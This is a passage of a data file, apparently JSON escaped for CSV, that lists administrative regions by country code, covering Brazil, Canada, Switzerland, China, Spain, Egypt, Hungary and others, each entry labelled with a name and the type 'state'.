      ""name"": ""Potos\u00ed"",
      ""type"": ""state""
    },
    ""S"": {
      ""name"": ""Santa Cruz"",
      ""type"": ""state""
    },
    ""T"": {
      ""name"": ""Tarija"",
      ""type"": ""state""
    },
  },
  ""BR"": {
    ""AC"": {
      ""name"": ""Acre"",
      ""type"": ""state""
    },
    ""AL"": {
      ""name"": ""Alagoas"",
      ""type"": ""state""
    },
    ""AP"": {
      ""name"": ""Amap\u00e1"",
      ""type"": ""state""
    },
    ""AM"": {
      ""name"": ""Amazonas"",
      ""type"": ""state""
    },
    ""BA"": {
      ""name"": ""Bahia"",
      ""type"": ""state""
    },
    ""CE"": {
      ""name"": ""Cear\u00e1"",
      ""type"": ""state""
    },
    ""DF"": {
      ""name"": ""Distrito Federal"",
      ""type"": ""state""
    },
    ""ES"": {
      ""name"": ""Esp\u00edrito Santo"",
      ""type"": ""state""
    },
    ""GO"": {
      ""name"": ""Goi\u00e1s"",
      ""type"": ""state""
    },
    ""MA"": {
      ""name"": ""Maranh\u00e3o"",
      ""type"": ""state""
    },
    ""MT"": {
      ""name"": ""Mato Grosso"",
      ""type"": ""state""
    },
    ""MS"": {
      ""name"": ""Mato Grosso do Sul"",
      ""type"": ""state""
    },
    ""MG"": {
      ""name"": ""Minas Gerais"",
      ""type"": ""state""
    },
    ""PA"": {
      ""name"": ""Par\u00e1"",
      ""type"": ""state""
    },
    ""PB"": {
      ""name"": ""Para\u00edba"",
      ""type"": ""state""
    },
    ""PR"": {
      ""name"": ""Paran\u00e1"",
      ""type"": ""state""
    },
    ""PE"": {
      ""name"": ""Pernambuco"",
      ""type"": ""state""
    },
    ""PI"": {
      ""name"": ""Piau\u00ed"",
      ""type"": ""state""
    },
    ""RJ"": {
      ""name"": ""Rio de Janeiro"",
      ""type"": ""state""
    },
    ""RN"": {
      ""name"": ""Rio Grande do Norte"",
      ""type"": ""state""
    },
    ""RS"": {
      ""name"": ""Rio Grande do Sul"",
      ""type"": ""state""
    },
    ""RO"": {
      ""name"": ""Rond\u00f4nia"",
      ""type"": ""state""
    },
    ""RR"": {
      ""name"": ""Roraima"",
      ""type"": ""state""
    },
    ""SC"": {
      ""name"": ""Santa Catarina"",
      ""type"": ""state""
    },
    ""SP"": {
      ""name"": ""S\u00e3o Paulo"",
      ""type"": ""state""
    },
    ""SE"": {
      ""name"": ""Sergipe"",
      ""type"": ""state""
    },
    ""TO"": {
      ""name"": ""Tocantins"",
      ""type"": ""state""
    },
  },
  ""CA"": {
    ""AB"": {
      ""name"": ""Alberta"",
      ""type"": ""state""
    },
    ""BC"": {
      ""name"": ""British Columbia"",
      ""type"": ""state""
    },
    ""MB"": {
      ""name"": ""Manitoba"",
      ""type"": ""state""
    },
    ""NB"": {
      ""name"": ""New Brunswick"",
      ""type"": ""state""
    },
    ""NL"": {
      ""name"": ""Newfoundland and Labrador"",
      ""type"": ""state""
    },
    ""NT"": {
      ""name"": ""Northwest Territories"",
      ""type"": ""state""
    },
    ""NS"": {
      ""name"": ""Nova Scotia"",
      ""type"": ""state""
    },
    ""NU"": {
      ""name"": ""Nunavut"",
      ""type"": ""state""
    },
    ""ON"": {
      ""name"": ""Ontario"",
      ""type"": ""state""
    },
    ""PE"": {
      ""name"": ""Prince Edward Island"",
      ""type"": ""state""
    },
    ""QC"": {
      ""name"": ""Quebec"",
      ""type"": ""state""
    },
    ""SK"": {
      ""name"": ""Saskatchewan"",
      ""type"": ""state""
    },
    ""YT"": {
      ""name"": ""Yukon Territory"",
      ""type"": ""state""
    },
  },
  ""CH"": {
    ""AG"": {
      ""name"": ""Aargau"",
      ""type"": ""state""
    },
    ""AR"": {
      ""name"": ""Appenzell Ausserrhoden"",
      ""type"": ""state""
    },
    ""AI"": {
      ""name"": ""Appenzell Innerrhoden"",
      ""type"": ""state""
    },
    ""BL"": {
      ""name"": ""Basel-Landschaft"",
      ""type"": ""state""
    },
    ""BS"": {
      ""name"": ""Basel-Stadt"",
      ""type"": ""state""
    },
    ""BE"": {
      ""name"": ""Bern"",
      ""type"": ""state""
    },
    ""FR"": {
      ""name"": ""Fribourg"",
      ""type"": ""state""
    },
    ""GE"": {
      ""name"": ""Geneva"",
      ""type"": ""state""
    },
    ""GL"": {
      ""name"": ""Glarus"",
      ""type"": ""state""
    },
    ""GR"": {
      ""name"": ""Graub\u00fcnden"",
      ""type"": ""state""
    },
    ""JU"": {
      ""name"": ""Jura"",
      ""type"": ""state""
    },
    ""LU"": {
      ""name"": ""Luzern"",
      ""type"": ""state""
    },
    ""NE"": {
      ""name"": ""Neuch\u00e2tel"",
      ""type"": ""state""
    },
    ""NW"": {
      ""name"": ""Nidwalden"",
      ""type"": ""state""
    },
    ""OW"": {
      ""name"": ""Obwalden"",
      ""type"": ""state""
    },
    ""SH"": {
      ""name"": ""Schaffhausen"",
      ""type"": ""state""
    },
    ""SZ"": {
      ""name"": ""Schwyz"",
      ""type"": ""state""
    },
    ""SO"": {
      ""name"": ""Solothurn"",
      ""type"": ""state""
    },
    ""SG"": {
      ""name"": ""St. Gallen"",
      ""type"": ""state""
    },
    ""TG"": {
      ""name"": ""Thurgau"",
      ""type"": ""state""
    },
    ""TI"": {
      ""name"": ""Ticino"",
      ""type"": ""state""
    },
    ""UR"": {
      ""name"": ""Uri"",
      ""type"": ""state""
    },
    ""VS"": {
      ""name"": ""Valais"",
      ""type"": ""state""
    },
    ""VD"": {
      ""name"": ""Vaud"",
      ""type"": ""state""
    },
    ""ZG"": {
      ""name"": ""Zug"",
      ""type"": ""state""
    },
    ""ZH"": {
      ""name"": ""Z\u00fcrich"",
      ""type"": ""state""
    },
  },
  ""CN"": {
    ""CN1"": {
      ""name"": ""Yunnan \/ \u4e91\u5357"",
      ""type"": ""state""
    },
    ""CN2"": {
      ""name"": ""Beijing \/ \u5317\u4eac"",
      ""type"": ""state""
    },
    ""CN3"": {
      ""name"": ""Tianjin \/ \u5929\u6d25"",
      ""type"": ""state""
    },
    ""CN4"": {
      ""name"": ""Hebei \/ \u6cb3\u5317"",
      ""type"": ""state""
    },
    ""CN5"": {
      ""name"": ""Shanxi \/ \u5c71\u897f"",
      ""type"": ""state""
    },
    ""CN6"": {
      ""name"": ""Inner Mongolia \/ \u5167\u8499\u53e4"",
      ""type"": ""state""
    },
    ""CN7"": {
      ""name"": ""Liaoning \/ \u8fbd\u5b81"",
      ""type"": ""state""
    },
    ""CN8"": {
      ""name"": ""Jilin \/ \u5409\u6797"",
      ""type"": ""state""
    },
    ""CN9"": {
      ""name"": ""Heilongjiang \/ \u9ed1\u9f99\u6c5f"",
      ""type"": ""state""
    },
    ""CN10"": {
      ""name"": ""Shanghai \/ \u4e0a\u6d77"",
      ""type"": ""state""
    },
    ""CN11"": {
      ""name"": ""Jiangsu \/ \u6c5f\u82cf"",
      ""type"": ""state""
    },
    ""CN12"": {
      ""name"": ""Zhejiang \/ \u6d59\u6c5f"",
      ""type"": ""state""
    },
    ""CN13"": {
      ""name"": ""Anhui \/ \u5b89\u5fbd"",
      ""type"": ""state""
    },
    ""CN14"": {
      ""name"": ""Fujian \/ \u798f\u5efa"",
      ""type"": ""state""
    },
    ""CN15"": {
      ""name"": ""Jiangxi \/ \u6c5f\u897f"",
      ""type"": ""state""
    },
    ""CN16"": {
      ""name"": ""Shandong \/ \u5c71\u4e1c"",
      ""type"": ""state""
    },
    ""CN17"": {
      ""name"": ""Henan \/ \u6cb3\u5357"",
      ""type"": ""state""
    },
    ""CN18"": {
      ""name"": ""Hubei \/ \u6e56\u5317"",
      ""type"": ""state""
    },
    ""CN19"": {
      ""name"": ""Hunan \/ \u6e56\u5357"",
      ""type"": ""state""
    },
    ""CN20"": {
      ""name"": ""Guangdong \/ \u5e7f\u4e1c"",
      ""type"": ""state""
    },
    ""CN21"": {
      ""name"": ""Guangxi Zhuang \/ \u5e7f\u897f\u58ee\u65cf"",
      ""type"": ""state"",
    },
    ""CN22"": {
      ""name"": ""Hainan \/ \u6d77\u5357"",
      ""type"": ""state""
    },
    ""CN23"": {
      ""name"": ""Chongqing \/ \u91cd\u5e86"",
      ""type"": ""state""
    },
    ""CN24"": {
      ""name"": ""Sichuan \/ \u56db\u5ddd"",
      ""type"": ""state""
    },
    ""CN25"": {
      ""name"": ""Guizhou \/ \u8d35\u5dde"",
      ""type"": ""state""
    },
    ""CN26"": {
      ""name"": ""Shaanxi \/ \u9655\u897f"",
      ""type"": ""state""
    },
    ""CN27"": {
      ""name"": ""Gansu \/ \u7518\u8083"",
      ""type"": ""state""
    },
    ""CN28"": {
      ""name"": ""Qinghai \/ \u9752\u6d77"",
      ""type"": ""state""
    },
    ""CN29"": {
      ""name"": ""Ningxia Hui \/ \u5b81\u590f"",
      ""type"": ""state""
    },
    ""CN30"": {
      ""name"": ""Macao \/ \u6fb3\u95e8"",
      ""type"": ""state""
    },
    ""CN31"": {
      ""name"": ""Tibet \/ \u897f\u85cf"",
      ""type"": ""state""
    },
    ""CN32"": {
      ""name"": ""Xinjiang \/ \u65b0\u7586"",
      ""type"": ""state""
    },
  },
  ""CZ"": {},
  ""DE"": {},
  ""DK"": {},
  ""DO"": {
    ""DO-01"": {
      ""name"": ""Distrito Nacional"",
      ""type"": ""state""
    },
    ""DO-02"": {
      ""name"": ""Azua"",
      ""type"": ""state""
    },
    ""DO-03"": {
      ""name"": ""Baoruco"",
      ""type"": ""state""
    },
    ""DO-04"": {
      ""name"": ""Barahona"",
      ""type"": ""state""
    },
    ""DO-05"": {
      ""name"": ""Dajab\u00f3n"",
      ""type"": ""state""
    },
    ""DO-06"": {
      ""name"": ""Duarte"",
      ""type"": ""state""
    },
    ""DO-07"": {
      ""name"": ""El\u00edas Pi\u00f1a"",
      ""type"": ""state""
    },
    ""DO-08"": {
      ""name"": ""El Seibo"",
      ""type"": ""state""
    },
    ""DO-09"": {
      ""name"": ""Espaillat"",
      ""type"": ""state""
    },
    ""DO-10"": {
      ""name"": ""Independencia"",
      ""type"": ""state""
    },
    ""DO-11"": {
      ""name"": ""La Altagracia"",
      ""type"": ""state""
    },
    ""DO-12"": {
      ""name"": ""La Romana"",
      ""type"": ""state""
    },
    ""DO-13"": {
      ""name"": ""La Vega"",
      ""type"": ""state""
    },
    ""DO-14"": {
      ""name"": ""Mar\u00eda Trinidad S\u00e1nchez"",
      ""type"": ""state""
    },
    ""DO-15"": {
      ""name"": ""Monte Cristi"",
      ""type"": ""state""
    },
    ""DO-16"": {
      ""name"": ""Pedernales"",
      ""type"": ""state""
    },
    ""DO-17"": {
      ""name"": ""Peravia"",
      ""type"": ""state""
    },
    ""DO-18"": {
      ""name"": ""Puerto Plata"",
      ""type"": ""state""
    },
    ""DO-19"": {
      ""name"": ""Hermanas Mirabal"",
      ""type"": ""state""
    },
    ""DO-20"": {
      ""name"": ""Saman\u00e1"",
      ""type"": ""state""
    },
    ""DO-21"": {
      ""name"": ""San Crist\u00f3bal"",
      ""type"": ""state""
    },
    ""DO-22"": {
      ""name"": ""San Juan"",
      ""type"": ""state""
    },
    ""DO-23"": {
      ""name"": ""San Pedro de Macor\u00eds"",
      ""type"": ""state""
    },
    ""DO-24"": {
      ""name"": ""S\u00e1nchez Ram\u00edrez"",
      ""type"": ""state""
    },
    ""DO-25"": {
      ""name"": ""Santiago"",
      ""type"": ""state""
    },
    ""DO-26"": {
      ""name"": ""Santiago Rodr\u00edguez"",
      ""type"": ""state""
    },
    ""DO-27"": {
      ""name"": ""Valverde"",
      ""type"": ""state""
    },
    ""DO-28"": {
      ""name"": ""Monse\u00f1or Nouel"",
      ""type"": ""state""
    },
    ""DO-29"": {
      ""name"": ""Monte Plata"",
      ""type"": ""state""
    },
    ""DO-30"": {
      ""name"": ""Hato Mayor"",
      ""type"": ""state""
    },
    ""DO-31"": {
      ""name"": ""San Jos\u00e9 de Ocoa"",
      ""type"": ""state""
    },
    ""DO-32"": {
      ""name"": ""Santo Domingo"",
      ""type"": ""state""
    },
  },
  ""DZ"": {
    ""DZ-01"": {
      ""name"": ""Adrar"",
      ""type"": ""state""
    },
    ""DZ-02"": {
      ""name"": ""Chlef"",
      ""type"": ""state""
    },
    ""DZ-03"": {
      ""name"": ""Laghouat"",
      ""type"": ""state""
    },
    ""DZ-04"": {
      ""name"": ""Oum El Bouaghi"",
      ""type"": ""state""
    },
    ""DZ-05"": {
      ""name"": ""Batna"",
      ""type"": ""state""
    },
    ""DZ-06"": {
      ""name"": ""B\u00e9ja\u00efa"",
      ""type"": ""state""
    },
    ""DZ-07"": {
      ""name"": ""Biskra"",
      ""type"": ""state""
    },
    ""DZ-08"": {
      ""name"": ""B\u00e9char"",
      ""type"": ""state""
    },
    ""DZ-09"": {
      ""name"": ""Blida"",
      ""type"": ""state""
    },
    ""DZ-10"": {
      ""name"": ""Bouira"",
      ""type"": ""state""
    },
    ""DZ-11"": {
      ""name"": ""Tamanghasset"",
      ""type"": ""state""
    },
    ""DZ-12"": {
      ""name"": ""T\u00e9bessa"",
      ""type"": ""state""
    },
    ""DZ-13"": {
      ""name"": ""Tlemcen"",
      ""type"": ""state""
    },
    ""DZ-14"": {
      ""name"": ""Tiaret"",
      ""type"": ""state""
    },
    ""DZ-15"": {
      ""name"": ""Tizi Ouzou"",
      ""type"": ""state""
    },
    ""DZ-16"": {
      ""name"": ""Algiers"",
      ""type"": ""state""
    },
    ""DZ-17"": {
      ""name"": ""Djelfa"",
      ""type"": ""state""
    },
    ""DZ-18"": {
      ""name"": ""Jijel"",
      ""type"": ""state""
    },
    ""DZ-19"": {
      ""name"": ""S\u00e9tif"",
      ""type"": ""state""
    },
    ""DZ-20"": {
      ""name"": ""Sa\u00efda"",
      ""type"": ""state""
    },
    ""DZ-21"": {
      ""name"": ""Skikda"",
      ""type"": ""state""
    },
    ""DZ-22"": {
      ""name"": ""Sidi Bel Abb\u00e8s"",
      ""type"": ""state""
    },
    ""DZ-23"": {
      ""name"": ""Annaba"",
      ""type"": ""state""
    },
    ""DZ-24"": {
      ""name"": ""Guelma"",
      ""type"": ""state""
    },
    ""DZ-25"": {
      ""name"": ""Constantine"",
      ""type"": ""state""
    },
    ""DZ-26"": {
      ""name"": ""M\u00e9d\u00e9a"",
      ""type"": ""state""
    },
    ""DZ-27"": {
      ""name"": ""Mostaganem"",
      ""type"": ""state""
    },
    ""DZ-28"": {
      ""name"": ""M\u2019Sila"",
      ""type"": ""state""
    },
    ""DZ-29"": {
      ""name"": ""Mascara"",
      ""type"": ""state""
    },
    ""DZ-30"": {
      ""name"": ""Ouargla"",
      ""type"": ""state""
    },
    ""DZ-31"": {
      ""name"": ""Oran"",
      ""type"": ""state""
    },
    ""DZ-32"": {
      ""name"": ""El Bayadh"",
      ""type"": ""state""
    },
    ""DZ-33"": {
      ""name"": ""Illizi"",
      ""type"": ""state""
    },
    ""DZ-34"": {
      ""name"": ""Bordj Bou Arr\u00e9ridj"",
      ""type"": ""state""
    },
    ""DZ-35"": {
      ""name"": ""Boumerd\u00e8s"",
      ""type"": ""state""
    },
    ""DZ-36"": {
      ""name"": ""El Tarf"",
      ""type"": ""state""
    },
    ""DZ-37"": {
      ""name"": ""Tindouf"",
      ""type"": ""state""
    },
    ""DZ-38"": {
      ""name"": ""Tissemsilt"",
      ""type"": ""state""
    },
    ""DZ-39"": {
      ""name"": ""El Oued"",
      ""type"": ""state""
    },
    ""DZ-40"": {
      ""name"": ""Khenchela"",
      ""type"": ""state""
    },
    ""DZ-41"": {
      ""name"": ""Souk Ahras"",
      ""type"": ""state""
    },
    ""DZ-42"": {
      ""name"": ""Tipasa"",
      ""type"": ""state""
    },
    ""DZ-43"": {
      ""name"": ""Mila"",
      ""type"": ""state""
    },
    ""DZ-44"": {
      ""name"": ""A\u00efn Defla"",
      ""type"": ""state""
    },
    ""DZ-45"": {
      ""name"": ""Naama"",
      ""type"": ""state""
    },
    ""DZ-46"": {
      ""name"": ""A\u00efn T\u00e9mouchent"",
      ""type"": ""state""
    },
    ""DZ-47"": {
      ""name"": ""Gharda\u00efa"",
      ""type"": ""state""
    },
    ""DZ-48"": {
      ""name"": ""Relizane"",
      ""type"": ""state""
    },
  },
  ""EE"": {},
  ""EG"": {
    ""EGALX"": {
      ""name"": ""Alexandria"",
      ""type"": ""state""
    },
    ""EGASN"": {
      ""name"": ""Aswan"",
      ""type"": ""state""
    },
    ""EGAST"": {
      ""name"": ""Asyut"",
      ""type"": ""state""
    },
    ""EGBA"": {
      ""name"": ""Red Sea"",
      ""type"": ""state""
    },
    ""EGBH"": {
      ""name"": ""Beheira"",
      ""type"": ""state""
    },
    ""EGBNS"": {
      ""name"": ""Beni Suef"",
      ""type"": ""state""
    },
    ""EGC"": {
      ""name"": ""Cairo"",
      ""type"": ""state""
    },
    ""EGDK"": {
      ""name"": ""Dakahlia"",
      ""type"": ""state""
    },
    ""EGDT"": {
      ""name"": ""Damietta"",
      ""type"": ""state""
    },
    ""EGFYM"": {
      ""name"": ""Faiyum"",
      ""type"": ""state""
    },
    ""EGGH"": {
      ""name"": ""Gharbia"",
      ""type"": ""state""
    },
    ""EGGZ"": {
      ""name"": ""Giza"",
      ""type"": ""state""
    },
    ""EGIS"": {
      ""name"": ""Ismailia"",
      ""type"": ""state""
    },
    ""EGJS"": {
      ""name"": ""South Sinai"",
      ""type"": ""state""
    },
    ""EGKB"": {
      ""name"": ""Qalyubia"",
      ""type"": ""state""
    },
    ""EGKFS"": {
      ""name"": ""Kafr el-Sheikh"",
      ""type"": ""state""
    },
    ""EGKN"": {
      ""name"": ""Qena"",
      ""type"": ""state""
    },
    ""EGLX"": {
      ""name"": ""Luxor"",
      ""type"": ""state""
    },
    ""EGMN"": {
      ""name"": ""Minya"",
      ""type"": ""state""
    },
    ""EGMNF"": {
      ""name"": ""Monufia"",
      ""type"": ""state""
    },
    ""EGMT"": {
      ""name"": ""Matrouh"",
      ""type"": ""state""
    },
    ""EGPTS"": {
      ""name"": ""Port Said"",
      ""type"": ""state""
    },
    ""EGSHG"": {
      ""name"": ""Sohag"",
      ""type"": ""state""
    },
    ""EGSHR"": {
      ""name"": ""Al Sharqia"",
      ""type"": ""state""
    },
    ""EGSIN"": {
      ""name"": ""North Sinai"",
      ""type"": ""state""
    },
    ""EGSUZ"": {
      ""name"": ""Suez"",
      ""type"": ""state""
    },
    ""EGWAD"": {
      ""name"": ""New Valley"",
      ""type"": ""state""
    },
  },
  ""ES"": {
    ""C"": {
      ""name"": ""A Coru\u00f1a"",
      ""type"": ""state""
    },
    ""VI"": {
      ""name"": ""Araba\/\u00c1lava"",
      ""type"": ""state""
    },
    ""AB"": {
      ""name"": ""Albacete"",
      ""type"": ""state""
    },
    ""A"": {
      ""name"": ""Alicante"",
      ""type"": ""state""
    },
    ""AL"": {
      ""name"": ""Almer\u00eda"",
      ""type"": ""state""
    },
    ""O"": {
      ""name"": ""Asturias"",
      ""type"": ""state""
    },
    ""AV"": {
      ""name"": ""\u00c1vila"",
      ""type"": ""state""
    },
    ""BA"": {
      ""name"": ""Badajoz"",
      ""type"": ""state""
    },
    ""PM"": {
      ""name"": ""Baleares"",
      ""type"": ""state""
    },
    ""B"": {
      ""name"": ""Barcelona"",
      ""type"": ""state""
    },
    ""BU"": {
      ""name"": ""Burgos"",
      ""type"": ""state""
    },
    ""CC"": {
      ""name"": ""C\u00e1ceres"",
      ""type"": ""state""
    },
    ""CA"": {
      ""name"": ""C\u00e1diz"",
      ""type"": ""state""
    },
    ""S"": {
      ""name"": ""Cantabria"",
      ""type"": ""state""
    },
    ""CS"": {
      ""name"": ""Castell\u00f3n"",
      ""type"": ""state""
    },
    ""CE"": {
      ""name"": ""Ceuta"",
      ""type"": ""state""
    },
    ""CR"": {
      ""name"": ""Ciudad Real"",
      ""type"": ""state""
    },
    ""CO"": {
      ""name"": ""C\u00f3rdoba"",
      ""type"": ""state""
    },
    ""CU"": {
      ""name"": ""Cuenca"",
      ""type"": ""state""
    },
    ""GI"": {
      ""name"": ""Girona"",
      ""type"": ""state""
    },
    ""GR"": {
      ""name"": ""Granada"",
      ""type"": ""state""
    },
    ""GU"": {
      ""name"": ""Guadalajara"",
      ""type"": ""state""
    },
    ""SS"": {
      ""name"": ""Gipuzkoa"",
      ""type"": ""state""
    },
    ""H"": {
      ""name"": ""Huelva"",
      ""type"": ""state""
    },
    ""HU"": {
      ""name"": ""Huesca"",
      ""type"": ""state""
    },
    ""J"": {
      ""name"": ""Ja\u00e9n"",
      ""type"": ""state""
    },
    ""LO"": {
      ""name"": ""La Rioja"",
      ""type"": ""state""
    },
    ""GC"": {
      ""name"": ""Las Palmas"",
      ""type"": ""state""
    },
    ""LE"": {
      ""name"": ""Le\u00f3n"",
      ""type"": ""state""
    },
    ""L"": {
      ""name"": ""Lleida"",
      ""type"": ""state""
    },
    ""LU"": {
      ""name"": ""Lugo"",
      ""type"": ""state""
    },
    ""M"": {
      ""name"": ""Madrid"",
      ""type"": ""state""
    },
    ""MA"": {
      ""name"": ""M\u00e1laga"",
      ""type"": ""state""
    },
    ""ML"": {
      ""name"": ""Melilla"",
      ""type"": ""state""
    },
    ""MU"": {
      ""name"": ""Murcia"",
      ""type"": ""state""
    },
    ""NA"": {
      ""name"": ""Navarra"",
      ""type"": ""state""
    },
    ""OR"": {
      ""name"": ""Ourense"",
      ""type"": ""state""
    },
    ""P"": {
      ""name"": ""Palencia"",
      ""type"": ""state""
    },
    ""PO"": {
      ""name"": ""Pontevedra"",
      ""type"": ""state""
    },
    ""SA"": {
      ""name"": ""Salamanca"",
      ""type"": ""state""
    },
    ""TF"": {
      ""name"": ""Santa Cruz de Tenerife"",
      ""type"": ""state""
    },
    ""SG"": {
      ""name"": ""Segovia"",
      ""type"": ""state""
    },
    ""SE"": {
      ""name"": ""Sevilla"",
      ""type"": ""state""
    },
    ""SO"": {
      ""name"": ""Soria"",
      ""type"": ""state""
    },
    ""T"": {
      ""name"": ""Tarragona"",
      ""type"": ""state""
    },
    ""TE"": {
      ""name"": ""Teruel"",
      ""type"": ""state""
    },
    ""TO"": {
      ""name"": ""Toledo"",
      ""type"": ""state""
    },
    ""V"": {
      ""name"": ""Valencia"",
      ""type"": ""state""
    },
    ""VA"": {
      ""name"": ""Valladolid"",
      ""type"": ""state""
    },
    ""BI"": {
      ""name"": ""Biscay"",
      ""type"": ""state""
    },
    ""ZA"": {
      ""name"": ""Zamora"",
      ""type"": ""state""
    },
    ""Z"": {
      ""name"": ""Zaragoza"",
      ""type"": ""state""
    },
  },
  ""FI"": {},
  ""FR"": {},
  ""GF"": {},
  ""GH"": {
    ""AF"": {
      ""name"": ""Ahafo"",
      ""type"": ""state""
    },
    ""AH"": {
      ""name"": ""Ashanti"",
      ""type"": ""state""
    },
    ""BA"": {
      ""name"": ""Brong-Ahafo"",
      ""type"": ""state""
    },
    ""BO"": {
      ""name"": ""Bono"",
      ""type"": ""state""
    },
    ""BE"": {
      ""name"": ""Bono East"",
      ""type"": ""state""
    },
    ""CP"": {
      ""name"": ""Central"",
      ""type"": ""state""
    },
    ""EP"": {
      ""name"": ""Eastern"",
      ""type"": ""state""
    },
    ""AA"": {
      ""name"": ""Greater Accra"",
      ""type"": ""state""
    },
    ""NE"": {
      ""name"": ""North East"",
      ""type"": ""state""
    },
    ""NP"": {
      ""name"": ""Northern"",
      ""type"": ""state""
    },
    ""OT"": {
      ""name"": ""Oti"",
      ""type"": ""state""
    },
    ""SV"": {
      ""name"": ""Savannah"",
      ""type"": ""state""
    },
    ""UE"": {
      ""name"": ""Upper East"",
      ""type"": ""state""
    },
    ""UW"": {
      ""name"": ""Upper West"",
      ""type"": ""state""
    },
    ""TV"": {
      ""name"": ""Volta"",
      ""type"": ""state""
    },
    ""WP"": {
      ""name"": ""Western"",
      ""type"": ""state""
    },
    ""WN"": {
      ""name"": ""Western North"",
      ""type"": ""state""
    },
  },
  ""GP"": {},
  ""GR"": {
    ""I"": {
      ""name"": ""Attica"",
      ""type"": ""state""
    },
    ""A"": {
      ""name"": ""East Macedonia and Thrace"",
      ""type"": ""state""
    },
    ""B"": {
      ""name"": ""Central Macedonia"",
      ""type"": ""state""
    },
    ""C"": {
      ""name"": ""West Macedonia"",
      ""type"": ""state""
    },
    ""D"": {
      ""name"": ""Epirus"",
      ""type"": ""state""
    },
    ""E"": {
      ""name"": ""Thessaly"",
      ""type"": ""state""
    },
    ""F"": {
      ""name"": ""Ionian Islands"",
      ""type"": ""state""
    },
    ""G"": {
      ""name"": ""West Greece"",
      ""type"": ""state""
    },
    ""H"": {
      ""name"": ""Central Greece"",
      ""type"": ""state""
    },
    ""J"": {
      ""name"": ""Peloponnese"",
      ""type"": ""state""
    },
    ""K"": {
      ""name"": ""North Aegean"",
      ""type"": ""state""
    },
    ""L"": {
      ""name"": ""South Aegean"",
      ""type"": ""state""
    },
    ""M"": {
      ""name"": ""Crete"",
      ""type"": ""state""
    },
  },
  ""GT"": {
    ""AV"": {
      ""name"": ""Alta Verapaz"",
      ""type"": ""state""
    },
    ""BV"": {
      ""name"": ""Baja Verapaz"",
      ""type"": ""state""
    },
    ""CM"": {
      ""name"": ""Chimaltenango"",
      ""type"": ""state""
    },
    ""CQ"": {
      ""name"": ""Chiquimula"",
      ""type"": ""state""
    },
    ""PR"": {
      ""name"": ""El Progreso"",
      ""type"": ""state""
    },
    ""ES"": {
      ""name"": ""Escuintla"",
      ""type"": ""state""
    },
    ""GU"": {
      ""name"": ""Guatemala"",
      ""type"": ""state""
    },
    ""HU"": {
      ""name"": ""Huehuetenango"",
      ""type"": ""state""
    },
    ""IZ"": {
      ""name"": ""Izabal"",
      ""type"": ""state""
    },
    ""JA"": {
      ""name"": ""Jalapa"",
      ""type"": ""state""
    },
    ""JU"": {
      ""name"": ""Jutiapa"",
      ""type"": ""state""
    },
    ""PE"": {
      ""name"": ""Pet\u00e9n"",
      ""type"": ""state""
    },
    ""QZ"": {
      ""name"": ""Quetzaltenango"",
      ""type"": ""state""
    },
    ""QC"": {
      ""name"": ""Quich\u00e9"",
      ""type"": ""state""
    },
    ""RE"": {
      ""name"": ""Retalhuleu"",
      ""type"": ""state""
    },
    ""SA"": {
      ""name"": ""Sacatep\u00e9quez"",
      ""type"": ""state""
    },
    ""SM"": {
      ""name"": ""San Marcos"",
      ""type"": ""state""
    },
    ""SR"": {
      ""name"": ""Santa Rosa"",
      ""type"": ""state""
    },
    ""SO"": {
      ""name"": ""Solol\u00e1"",
      ""type"": ""state""
    },
    ""SU"": {
      ""name"": ""Suchitep\u00e9quez"",
      ""type"": ""state""
    },
    ""TO"": {
      ""name"": ""Totonicap\u00e1n"",
      ""type"": ""state""
    },
    ""ZA"": {
      ""name"": ""Zacapa"",
      ""type"": ""state""
    },
  },
  ""HK"": {
    ""HONG KONG"": {
      ""name"": ""Hong Kong Island"",
      ""type"": ""state""
    },
    ""KOWLOON"": {
      ""name"": ""Kowloon"",
      ""type"": ""state""
    },
    ""NEW TERRITORIES"": {
      ""name"": ""New Territories"",
      ""type"": ""state""
    },
  },
  ""HU"": {
    ""BK"": {
      ""name"": ""B\u00e1cs-Kiskun"",
      ""type"": ""state""
    },
    ""BE"": {
      ""name"": ""B\u00e9k\u00e9s"",
      ""type"": ""state""
    },
    ""BA"": {
      ""name"": ""Baranya"",
      ""type"": ""state""
    },
    ""BZ"": {
      ""name"": ""Borsod-Aba\u00faj-Zempl\u00e9n"",
      ""type"": ""state""
    },
    ""BU"": {
      ""name"": ""Budapest"",
      ""type"": ""state""
    },
    ""CS"": {
      ""name"": ""Csongr\u00e1d-Csan\u00e1d"",
      ""type"": ""state""
    },
    ""FE"": {
      ""name"": ""Fej\u00e9r"",
      ""type"": ""state""
    },
    ""GS"": {
      ""name"": ""Gy\u0151r-Moson-Sopron"",
      ""type"": ""state""
    },
    ""HB"": {
      ""name"": ""Hajd\u00fa-Bihar"",
      ""type"": ""state""
    },
    ""HE"": {
      ""name"": ""Heves"",
      ""type"": ""state""
    },
    ""JN"": {
      ""name"": ""J\u00e1sz-Nagykun-Szolnok"",
      ""type"": ""state""
    },
    ""KE"": {
      ""name"": ""Kom\u00e1rom-Esztergom"",
      ""type"": ""state""
    },
    ""NO"": {
      ""name"": ""N\u00f3gr\u00e1d"",
      ""type"": ""state""
    },
    ""PE"": {
      ""name"": ""Pest"",
      ""type"": ""state""
    },
    ""SO"": {
      ""name"": ""Somogy"",
      ""type"": ""state""
    },
    ""SZ"": {
      ""name"": ""Szabolcs-Szatm\u00e1r-Bereg"",
      ""type"": ""state""
    },
    ""TO"": {
      ""name"": ""Tolna"",
      ""type"": ""state""
    },
    ""VA"": {
      ""name"": ""Vas"",
      ""type"": ""state""
    },
    ""VE"": {
      ""name"": ""Veszpr\u00e9m"",
      ""type"": ""state""
    },
    ""ZA"": {
      ""name"": ""Zala"",
      ""type"": ""state""
    },
  },
  ""ID"": {
    ""AC"": {
      ""name"": ""Daerah Istimewa Aceh"",
      ""type"": ""state""
    },
    ""SU"": {
      ""name"": ""Sumatera Utara"",
      ""type"": ""state""
    },
    ""SB"": {
      ""name"": ""Sumatera Barat"",
      ""type"": ""state""
    },
    ""RI"": {
      ""name"": ""Riau"",
      ""type"": ""state""
    },
    ""KR"": {
      ""name"": ""Kepulauan Riau"",
      ""type"": ""state""
    },
    ""JA"": {
      ""name"": ""Jambi"",
      ""type"": ""state""
    },
    ""SS"": {
      ""name"": ""Sumatera Selatan"",
      ""type"": ""state""
    },
    ""BB"": {
      ""name"": ""Bangka Belitung"",
      ""type"": ""state""
    },
    ""BE"": {
      ""name"": ""Bengkulu"",
      ""type"": ""state""
    },
    ""LA"": {
      ""name"": ""Lampung"",
      ""type"": ""state""
    },
    ""JK"": {
      ""name"": ""DKI Jakarta"",
      ""type"": ""state""
    },
    ""JB"": {
      ""name"": ""Jawa Barat"",
